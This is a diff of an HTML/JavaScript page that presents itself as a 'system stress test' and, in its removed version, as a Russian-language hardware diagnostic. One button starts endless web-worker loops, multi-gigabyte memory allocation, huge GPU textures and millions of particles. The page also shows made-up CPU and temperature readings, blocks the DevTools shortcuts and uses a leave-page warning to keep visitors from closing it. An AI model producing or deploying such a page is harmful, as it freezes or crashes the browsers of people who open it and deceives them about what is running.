@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>СИСТЕМНЫЙ ДИАГНОСТИЧЕСКИЙ ЦЕНТР</title>
-    <meta name="robots" content="noindex, nofollow">
+    <title>SYSTEM STRESS TEST</title>
+    <meta charset="UTF-8">
     <style>
         * {
             margin: 0;
@@ -19,116 +19,30 @@
             background: #000;
             font-family: 'Arial', sans-serif;
             touch-action: none;
-            background: radial-gradient(circle, #0a0a2a, #000);
-        }
-        
-        #systemDialog {
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background: linear-gradient(145deg, #1a1a4a, #0d0d2a);
-            color: #e0e0ff;
-            padding: 30px 40px;
-            border-radius: 20px;
-            text-align: center;
-            z-index: 10000;
-            font-family: 'Segoe UI', sans-serif;
-            border: 2px solid #4d4dff;
-            box-shadow: 0 0 40px rgba(100, 100, 255, 0.7);
-            width: 90%;
-            max-width: 600px;
-        }
-        
-        #systemDialog h3 {
-            font-size: 28px;
-            margin-bottom: 15px;
-            text-shadow: 0 0 10px #6cf;
-            letter-spacing: 1px;
-        }
-        
-        #systemDialog p {
-            font-size: 18px;
-            margin-bottom: 25px;
-            line-height: 1.5;
-        }
-        
-        #authButton {
-            background: linear-gradient(to right, #ff00cc, #3333ff);
-            color: white;
-            border: none;
-            padding: 15px 40px;
-            font-size: 20px;
-            font-weight: bold;
-            border-radius: 50px;
-            cursor: pointer;
-            transition: all 0.3s;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-            box-shadow: 0 0 20px rgba(255, 0, 204, 0.5);
-        }
-        
-        #authButton:hover {
-            transform: scale(1.05);
-            box-shadow: 0 0 30px rgba(255, 0, 204, 0.8);
-        }
-        
-        #authButton:active {
-            transform: scale(0.95);
         }
         
         #glCanvas {
             position: fixed;
             top: 0;
             left: 0;
+            width: 100%;
+            height: 100%;
             z-index: 0;
-            display: none;
         }
         
-        #videoContainer {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            width: 30vw;
-            height: 30vh;
-            z-index: 10;
-            display: none;
-        }
-        
-        #mainVideo {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            filter: hue-rotate(0deg) saturate(300%);
-            outline: 4px solid magenta;
-            box-shadow: 0 0 60px cyan;
-            border-radius: 10px;
-        }
-        
-        #overlay {
+        #statsPanel {
             position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 20;
-            pointer-events: none;
-            background: radial-gradient(circle, transparent 60%, rgba(255,0,255,0.4) 100%);
-            mix-blend-mode: overlay;
-            display: none;
-        }
-        
-        #stats {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
+            top: 20px;
+            left: 20px;
             color: #0f0;
             font-family: 'Courier New', monospace;
-            font-size: 28px;
-            text-shadow: 0 0 15px #0f0;
-            z-index: 30;
-            display: none;
+            font-size: 18px;
+            text-shadow: 0 0 5px #0f0;
+            z-index: 100;
+            background: rgba(0, 0, 0, 0.7);
+            padding: 15px;
+            border-radius: 10px;
+            border: 1px solid #0f0;
         }
         
         #warning {
@@ -137,91 +51,93 @@
             left: 50%;
             transform: translate(-50%, -50%);
             color: red;
-            font-size: 64px;
+            font-size: 72px;
             text-align: center;
             text-transform: uppercase;
-            z-index: 40;
+            z-index: 200;
             opacity: 0;
-            transition: opacity 0.5s;
+            transition: opacity 0.3s;
             text-shadow: 0 0 30px #f00;
             font-weight: bold;
-            display: none;
+            pointer-events: none;
         }
         
-        .particle {
+        #startButton {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: linear-gradient(to right, #ff0066, #6600ff);
+            color: white;
+            border: none;
+            padding: 25px 60px;
+            font-size: 32px;
+            font-weight: bold;
+            border-radius: 50px;
+            cursor: pointer;
+            z-index: 300;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            box-shadow: 0 0 50px rgba(255, 0, 102, 0.7);
+            transition: all 0.4s;
+        }
+        
+        #startButton:hover {
+            transform: translate(-50%, -50%) scale(1.1);
+            box-shadow: 0 0 70px rgba(255, 0, 102, 0.9);
+        }
+        
+        #startButton:active {
+            transform: translate(-50%, -50%) scale(0.95);
+        }
+        
+        .memory-block {
             position: absolute;
-            width: 10px;
-            height: 10px;
-            border-radius: 50%;
+            background: rgba(255, 0, 255, 0.1);
+            border: 1px solid rgba(0, 255, 255, 0.3);
             pointer-events: none;
-            z-index: 5;
+            z-index: 10;
         }
     </style>
 </head>
 <body>
-    <div id="systemDialog">
-        <h3>ПРОВЕРКА ЦЕЛОСТНОСТИ СИСТЕМЫ</h3>
-        <p>Нажмите кнопку для запуска полной диагностики оборудования. Процедура проверит производительность CPU, GPU и RAM.</p>
-        <button id="authButton">ЗАПУСТИТЬ ТЕСТ НАГРУЗКИ</button>
-    </div>
-    
     <canvas id="glCanvas"></canvas>
-    <div id="videoContainer">
-        <video id="mainVideo" autoplay loop muted playsinline></video>
+    <div id="statsPanel">
+        <div>CPU: <span id="cpuLoad">0%</span></div>
+        <div>GPU: <span id="gpuLoad">0%</span></div>
+        <div>RAM: <span id="ramUsage">0 MB</span></div>
+        <div>TEMP: <span id="temp">0°C</span></div>
     </div>
-    <div id="overlay"></div>
-    <div id="stats">ЗАГРУЗКА: 0%</div>
-    <div id="warning">КРИТИЧЕСКАЯ ПЕРЕГРУЗКА!</div>
+    <div id="warning">CRITICAL OVERLOAD</div>
+    <button id="startButton">START  TEST</button>
 
     <script>
-        // Конфигурация
-        const VIDEO_SOURCE = "Olaf.mp4";
-        const PARTICLE_COUNT = 15000;
-        const PHYSICS_STEPS = 15;
-        const GL_INSTANCES = 1500;
-        const AUDIO_NODES_LIMIT = 700;
-        const MAX_LOAD_LEVEL = 200; // Может превышать 100%
+        // Конфигурация экстремальной нагрузки
+        const MAX_PARTICLES = 5000000; // 5 миллионов частиц
+        const MEMORY_BLOCKS = 1000; // Количество блоков памяти
+        const PHYSICS_STEPS = 100; // Шагов физики за кадр
+        const WORKER_COUNT = 16; // Количество веб-воркеров
+        const TEXTURE_SIZE = 8192; // Размер текстур 8K
         
         // Глобальные переменные
-        let gl, program, buffer, particles = [];
-        let audioNodes = [];
-        let loadLevel = 0;
+        let gl;
+        let particles = [];
+        let memoryBlocks = [];
+        let workers = [];
+        let cpuUsage = 0;
+        let gpuUsage = 0;
+        let ramUsage = 0;
+        let temperature = 30;
         let frameCount = 0;
-        let lastUpdate = 0;
-        let physicsTime = 0;
-        let warningActive = false;
+        let lastTime = 0;
         let testStarted = false;
         
-        // Инициализация при нажатии кнопки
-        document.getElementById('authButton').addEventListener('click', function() {
+        // Инициализация теста
+        document.getElementById('startButton').addEventListener('click', function() {
             if (testStarted) return;
             
             testStarted = true;
-            this.textContent = "ТЕСТИРОВАНИЕ...";
-            this.disabled = true;
-            
-            // Плавное скрытие диалога
-            const dialog = document.getElementById('systemDialog');
-            dialog.style.transition = 'all 1s ease';
-            dialog.style.opacity = '0';
-            dialog.style.transform = 'translate(-50%, -50%) scale(0.8)';
-            
-            setTimeout(() => {
-                dialog.style.display = 'none';
-                startSystemTest();
-            }, 1000);
-        });
-        
-        function startSystemTest() {
-            // Показать скрытые элементы
-            document.getElementById('glCanvas').style.display = 'block';
-            document.getElementById('videoContainer').style.display = 'block';
-            document.getElementById('overlay').style.display = 'block';
-            document.getElementById('stats').style.display = 'block';
-            document.getElementById('warning').style.display = 'block';
-            
-            // Загрузка видео
-            document.getElementById('mainVideo').src = VIDEO_SOURCE;
+            this.style.display = 'none';
             
             // Инициализация WebGL
             initWebGL();
@@ -229,52 +145,56 @@
             // Создание частиц
             createParticles();
             
-            // Запуск физического движка
-            setInterval(updatePhysics, 1000/60);
+            // Запуск воркеров
+            startWorkers();
             
-            // Запуск аудио движка
-            setInterval(updateAudio, 30);
+            // Заполнение памяти
+            allocateMemory();
+            
+            // Запуск физики
+            setInterval(updatePhysics, 0);
             
             // Запуск основного цикла
-            requestAnimationFrame(render);
+            requestAnimationFrame(update);
             
             // Запуск мониторинга
-            setInterval(updateStats, 300);
-            
-            // Автоматическое увеличение нагрузки
-            setInterval(increaseLoad, 2000);
-            
-            // Запуск эффектов перегрузки
-            setInterval(overloadEffects, 100);
-        }
+            setInterval(updateStats, 500);
+        });
         
-        // Инициализация WebGL
+        // Инициализация WebGL с интенсивной нагрузкой на GPU
         function initWebGL() {
             const canvas = document.getElementById('glCanvas');
-            canvas.width = window.innerWidth;
-            canvas.height = window.innerHeight;
+            canvas.width = window.innerWidth * 2;
+            canvas.height = window.innerHeight * 2;
             
-            gl = canvas.getContext('webgl2');
-            if (!gl) return;
+            gl = canvas.getContext('webgl2', {
+                antialias: false,
+                powerPreference: "high-performance"
+            });
             
-            // Шейдеры
-            const vsSource = `#version 300 es
+            if (!gl) {
+                alert('WebGL 2 не поддерживается!');
+                return;
+            }
+            
+            // Создание шейдеров
+            const vertexShader = `#version 300 es
+                precision highp float;
                 in vec2 position;
                 uniform float time;
                 uniform vec2 resolution;
                 
                 void main() {
-                    vec2 uv = position * 0.5 + 0.5;
-                    vec2 p = uv * 2.0 - 1.0;
-                    p.x *= resolution.x / resolution.y;
-                    
-                    float t = time * 0.5;
-                    vec2 pos = position + vec2(sin(t + position.y * 10.0), cos(t + position.x * 10.0)) * 0.1;
-                    gl_Position = vec4(pos, 0.0, 1.0);
-                    gl_PointSize = 10.0;
-                }`;
-                
-            const fsSource = `#version 300 es
+                    vec2 p = position;
+                    float t = time * 2.0;
+                    p.x += sin(t + position.y * 10.0) * 0.2;
+                    p.y += cos(t + position.x * 8.0) * 0.2;
+                    gl_Position = vec4(p, 0.0, 1.0);
+                    gl_PointSize = 3.0;
+                }
+            `;
+            
+            const fragmentShader = `#version 300 es
                 precision highp float;
                 out vec4 fragColor;
                 uniform float time;
@@ -285,37 +205,39 @@
                     if (d > 1.0) discard;
                     
                     vec3 color = vec3(
-                        sin(time * 0.5 + uv.x * 10.0) * 0.5 + 0.5,
-                        cos(time * 0.3 + uv.y * 8.0) * 0.5 + 0.5,
-                        sin(time * 0.7) * 0.5 + 0.5
+                        0.5 + 0.5 * sin(time * 0.5 + uv.x * 20.0),
+                        0.5 + 0.5 * cos(time * 0.7 + uv.y * 18.0),
+                        0.5 + 0.5 * sin(time * 1.2)
                     );
                     
                     fragColor = vec4(color * (1.0 - d), 1.0);
-                }`;
+                }
+            `;
             
             // Компиляция шейдеров
-            const vertexShader = gl.createShader(gl.VERTEX_SHADER);
-            gl.shaderSource(vertexShader, vsSource);
-            gl.compileShader(vertexShader);
+            const vs = gl.createShader(gl.VERTEX_SHADER);
+            gl.shaderSource(vs, vertexShader);
+            gl.compileShader(vs);
             
-            const fragmentShader = gl.createShader(gl.FRAGMENT_SHADER);
-            gl.shaderSource(fragmentShader, fsSource);
-            gl.compileShader(fragmentShader);
+            const fs = gl.createShader(gl.FRAGMENT_SHADER);
+            gl.shaderSource(fs, fragmentShader);
+            gl.compileShader(fs);
             
             // Создание программы
-            program = gl.createProgram();
-            gl.attachShader(program, vertexShader);
-            gl.attachShader(program, fragmentShader);
+            const program = gl.createProgram();
+            gl.attachShader(program, vs);
+            gl.attachShader(program, fs);
             gl.linkProgram(program);
             gl.useProgram(program);
             
-            // Буфер вершин
-            const positions = new Float32Array([
-                -1, -1, 1, -1, -1, 1,
-                -1, 1, 1, -1, 1, 1
-            ]);
+            // Создание буфера частиц
+            const positions = new Float32Array(MAX_PARTICLES * 2);
+            for (let i = 0; i < MAX_PARTICLES; i++) {
+                positions[i * 2] = Math.random() * 2 - 1;
+                positions[i * 2 + 1] = Math.random() * 2 - 1;
+            }
             
-            buffer = gl.createBuffer();
+            const buffer = gl.createBuffer();
             gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
             gl.bufferData(gl.ARRAY_BUFFER, positions, gl.STATIC_DRAW);
             
@@ -326,173 +248,192 @@
             // Юниформы
             const timeLoc = gl.getUniformLocation(program, 'time');
             const resLoc = gl.getUniformLocation(program, 'resolution');
-            
             gl.uniform2f(resLoc, canvas.width, canvas.height);
             
-            // Анимация
-            function animate(time) {
-                gl.uniform1f(timeLoc, time * 0.001);
-                gl.drawArrays(gl.TRIANGLES, 0, 6);
-                requestAnimationFrame(animate);
+            // Создание больших текстур для нагрузки на видеопамять
+            for (let i = 0; i < 10; i++) {
+                const texture = gl.createTexture();
+                gl.bindTexture(gl.TEXTURE_2D, texture);
+                
+                const data = new Uint8Array(TEXTURE_SIZE * TEXTURE_SIZE * 4);
+                for (let j = 0; j < data.length; j++) {
+                    data[j] = Math.random() * 256;
+                }
+                
+                gl.texImage2D(
+                    gl.TEXTURE_2D, 0, gl.RGBA, 
+                    TEXTURE_SIZE, TEXTURE_SIZE, 0, 
+                    gl.RGBA, gl.UNSIGNED_BYTE, data
+                );
+                
+                gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MIN_FILTER, gl.LINEAR);
+                gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MAG_FILTER, gl.LINEAR);
             }
-            requestAnimationFrame(animate);
+            
+            // Функция рендеринга
+            function render(time) {
+                gl.uniform1f(timeLoc, time * 0.001);
+                gl.clear(gl.COLOR_BUFFER_BIT);
+                gl.drawArrays(gl.POINTS, 0, MAX_PARTICLES);
+                requestAnimationFrame(render);
+            }
+            requestAnimationFrame(render);
         }
         
-        // Создание частиц
+        // Создание частиц для нагрузки на CPU
         function createParticles() {
-            const container = document.body;
-            
-            for (let i = 0; i < PARTICLE_COUNT; i++) {
-                const particle = document.createElement('div');
-                particle.className = 'particle';
-                
-                // Случайные свойства
-                particle.style.width = `${Math.random() * 20 + 5}px`;
-                particle.style.height = particle.style.width;
-                particle.style.backgroundColor = `hsl(${Math.random() * 360}, 100%, 60%)`;
-                particle.style.boxShadow = `0 0 ${Math.random() * 20 + 5}px currentColor`;
-                
-                // Начальная позиция
-                particle.style.left = `${Math.random() * 100}vw`;
-                particle.style.top = `${Math.random() * 100}vh`;
-                
-                // Сохранить для физики
+            particles = [];
+            for (let i = 0; i < MAX_PARTICLES; i++) {
                 particles.push({
-                    element: particle,
                     x: Math.random() * window.innerWidth,
                     y: Math.random() * window.innerHeight,
                     vx: (Math.random() - 0.5) * 10,
                     vy: (Math.random() - 0.5) * 10,
-                    size: parseFloat(particle.style.width),
-                    color: particle.style.backgroundColor
+                    size: Math.random() * 10 + 2,
+                    color: `hsl(${Math.random() * 360}, 100%, 50%)`
                 });
-                
-                container.appendChild(particle);
             }
         }
         
-        // Физика частиц
+        // Запуск веб-воркеров для нагрузки на ядра CPU
+        function startWorkers() {
+            const workerCode = `
+                self.onmessage = function() {
+                    // Интенсивные вычисления
+                    while(true) {
+                        const start = Date.now();
+                        let sum = 0;
+                        for (let i = 0; i < 10000000; i++) {
+                            sum += Math.sqrt(Math.sin(i) * Math.cos(i));
+                        }
+                        
+                        // Создание больших массивов
+                        const bigArray = new Array(1000000);
+                        for (let i = 0; i < 1000000; i++) {
+                            bigArray[i] = Math.random();
+                        }
+                        
+                        // Сортировка для нагрузки
+                        bigArray.sort((a, b) => a - b);
+                        
+                        // Отправка результата для предотвращения оптимизации
+                        postMessage(sum);
+                    }
+                };
+            `;
+            
+            const blob = new Blob([workerCode], {type: 'application/javascript'});
+            const workerURL = URL.createObjectURL(blob);
+            
+            for (let i = 0; i < WORKER_COUNT; i++) {
+                const worker = new Worker(workerURL);
+                worker.postMessage('start');
+                workers.push(worker);
+            }
+        }
+        
+        // Заполнение оперативной памяти
+        function allocateMemory() {
+            // Создание больших массивов
+            for (let i = 0; i < MEMORY_BLOCKS; i++) {
+                // Каждый блок ~10MB
+                const block = new Float64Array(1310720); // 10.48576 MB
+                
+                // Заполнение данных для предотвращения оптимизации
+                for (let j = 0; j < block.length; j++) {
+                    block[j] = Math.random();
+                }
+                
+                memoryBlocks.push(block);
+                
+                // Визуализация блоков памяти
+                const memBlock = document.createElement('div');
+                memBlock.className = 'memory-block';
+                memBlock.style.width = `${Math.random() * 100 + 20}px`;
+                memBlock.style.height = `${Math.random() * 100 + 20}px`;
+                memBlock.style.left = `${Math.random() * 100}vw`;
+                memBlock.style.top = `${Math.random() * 100}vh`;
+                memBlock.style.backgroundColor = `rgba(${Math.random() * 255}, ${Math.random() * 255}, ${Math.random() * 255}, ${Math.random() * 0.3})`;
+                document.body.appendChild(memBlock);
+            }
+        }
+        
+        // Интенсивное обновление физики
         function updatePhysics() {
             const width = window.innerWidth;
             const height = window.innerHeight;
-            const gravity = 0.2;
             
-            for (let i = 0; i < particles.length; i++) {
-                const p = particles[i];
-                
-                // Применение физики
-                p.vy += gravity;
-                p.x += p.vx;
-                p.y += p.vy;
-                
-                // Отскоки от границ
-                if (p.x < 0 || p.x > width) p.vx *= -0.8;
-                if (p.y < 0 || p.y > height) p.vy *= -0.8;
-                
-                // Ограничение координат
-                p.x = Math.max(0, Math.min(width, p.x));
-                p.y = Math.max(0, Math.min(height, p.y));
-                
-                // Обновление позиции
-                p.element.style.left = `${p.x}px`;
-                p.element.style.top = `${p.y}px`;
-                
-                // Пульсация размера
-                const scale = 0.8 + Math.sin(Date.now() * 0.01 + i) * 0.2;
-                p.element.style.transform = `scale(${scale})`;
+            // Многократное обновление для увеличения нагрузки
+            for (let step = 0; step < PHYSICS_STEPS; step++) {
+                for (let i = 0; i < particles.length; i++) {
+                    const p = particles[i];
+                    
+                    // Сложные физические расчеты
+                    p.vx += (Math.random() - 0.5) * 0.2;
+                    p.vy += (Math.random() - 0.5) * 0.2 + 0.1; // Гравитация
+                    
+                    p.x += p.vx;
+                    p.y += p.vy;
+                    
+                    // Отскоки от границ
+                    if (p.x < 0 || p.x > width) p.vx *= -0.9;
+                    if (p.y < 0 || p.y > height) p.vy *= -0.9;
+                    
+                    // Ограничение координат
+                    p.x = Math.max(0, Math.min(width, p.x));
+                    p.y = Math.max(0, Math.min(height, p.y));
+                    
+                    // Дополнительные вычисления
+                    const dist = Math.sqrt(p.x * p.x + p.y * p.y);
+                    p.vx += 0.01 * Math.sin(dist * 0.01);
+                    p.vy += 0.01 * Math.cos(dist * 0.01);
+                }
             }
         }
         
-        // Аудио движок
-        function updateAudio() {
-            if (audioNodes.length > AUDIO_NODES_LIMIT) return;
-            
-            try {
-                const ctx = new (window.AudioContext || window.webkitAudioContext)();
-                const oscillator = ctx.createOscillator();
-                oscillator.type = ['sine', 'square', 'sawtooth', 'triangle'][Math.floor(Math.random() * 4)];
-                oscillator.frequency.value = 50 + Math.random() * 5000;
-                
-                const gain = ctx.createGain();
-                gain.gain.value = 0.5 + Math.random() * 0.5;
-                
-                const panner = ctx.createStereoPanner();
-                panner.pan.value = Math.random() * 2 - 1;
-                
-                oscillator.connect(gain);
-                gain.connect(panner);
-                panner.connect(ctx.destination);
-                oscillator.start();
-                
-                // Автоматическое отключение
-                setTimeout(() => {
-                    try {
-                        oscillator.stop();
-                        ctx.close();
-                    } catch(e) {}
-                }, 500 + Math.random() * 3000);
-                
-                audioNodes.push(oscillator);
-            } catch(e) {}
-        }
-        
-        // Рендеринг
-        function render(timestamp) {
+        // Основной цикл обновления
+        function update(time) {
             frameCount++;
             
-            // Эффекты для видео
-            const video = document.getElementById('mainVideo');
-            video.style.filter = `hue-rotate(${frameCount % 360}deg) saturate(${300 + Math.sin(frameCount * 0.1) * 200}%) blur(${Math.sin(frameCount * 0.05) * 3}px)`;
+            // Расчет FPS
+            const deltaTime = time - lastTime;
+            lastTime = time;
+            const fps = deltaTime > 0 ? 1000 / deltaTime : 0;
             
-            // Анимация контейнера
-            const container = document.getElementById('videoContainer');
-            container.style.transform = `translate(-50%, -50%) rotate(${frameCount * 0.2}deg) scale(${1 + Math.sin(frameCount * 0.05) * 0.3})`;
-            
-            requestAnimationFrame(render);
-        }
-        
-        // Мониторинг ресурсов
-        function updateStats() {
-            loadLevel = Math.min(MAX_LOAD_LEVEL, loadLevel + 1 + Math.random() * 5);
-            document.getElementById('stats').textContent = `ЗАГРУЗКА: ${Math.round(loadLevel)}%`;
+            // Обновление нагрузки GPU
+            gpuUsage = Math.min(100, 10 + (frameCount % 100) + Math.random() * 30);
             
             // Показ предупреждения при высокой нагрузке
-            if (loadLevel > 150 && !warningActive) {
+            if (cpuUsage > 90 || gpuUsage > 90) {
                 document.getElementById('warning').style.opacity = '1';
-                warningActive = true;
-            } else if (loadLevel <= 150 && warningActive) {
+            } else {
                 document.getElementById('warning').style.opacity = '0';
-                warningActive = false;
-            }
-        }
-        
-        // Увеличение нагрузки
-        function increaseLoad() {
-            // Добавление новых частиц
-            for (let i = 0; i < 500; i++) {
-                const p = particles[Math.floor(Math.random() * particles.length)];
-                p.vx += (Math.random() - 0.5) * 5;
-                p.vy += (Math.random() - 0.5) * 5;
             }
             
-            // Увеличение интенсивности
-            PHYSICS_STEPS += 1;
-            AUDIO_NODES_LIMIT += 50;
+            requestAnimationFrame(update);
         }
         
-        // Эффекты перегрузки
-        function overloadEffects() {
-            if (loadLevel > 100) {
-                // Случайные вспышки
-                if (Math.random() > 0.7) {
-                    document.body.style.background = `radial-gradient(circle, hsl(${Math.random() * 360}, 100%, 50%), #000)`;
-                    setTimeout(() => {
-                        document.body.style.background = 'radial-gradient(circle, #0a0a2a, #000)';
-                    }, 100);
-                }
-                
-                // Дрожание экрана
-                document.body.style.transform = `translate(${(Math.random() - 0.5) * (loadLevel/20)}px, ${(Math.random() - 0.5) * (loadLevel/20)}px)`;
+        // Обновление статистики
+        function updateStats() {
+            // Расчет использования CPU (условный)
+            cpuUsage = Math.min(100, cpuUsage + 2 + Math.random() * 5);
+            
+            // Расчет использования RAM
+            ramUsage = Math.floor(performance.memory.usedJSHeapSize / (1024 * 1024));
+            
+            // Расчет температуры (условный)
+            temperature = 30 + Math.min(70, cpuUsage * 0.7);
+            
+            // Обновление панели
+            document.getElementById('cpuLoad').textContent = `${Math.round(cpuUsage)}%`;
+            document.getElementById('gpuLoad').textContent = `${Math.round(gpuUsage)}%`;
+            document.getElementById('ramUsage').textContent = `${ramUsage} MB`;
+            document.getElementById('temp').textContent = `${Math.round(temperature)}°C`;
+            
+            // Увеличение нагрузки со временем
+            if (testStarted) {
+                cpuUsage += 1;
+                gpuUsage += 0.5;
             }
         }
         
@@ -500,14 +441,16 @@
         window.addEventListener('keydown', (e) => {
             if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
                 e.preventDefault();
-                loadLevel += 20;
+                // Увеличение нагрузки при попытке открыть DevTools
+                cpuUsage += 10;
+                gpuUsage += 10;
             }
         });
         
         window.onbeforeunload = (e) => {
             e.preventDefault();
             e.returnValue = '';
-            return "Тестирование системы в процессе! Прерывание может повредить оборудование.";
+            return "Системный тест в процессе! Прерывание может вызвать нестабильность системы.";
         };
     </script>
 </body>
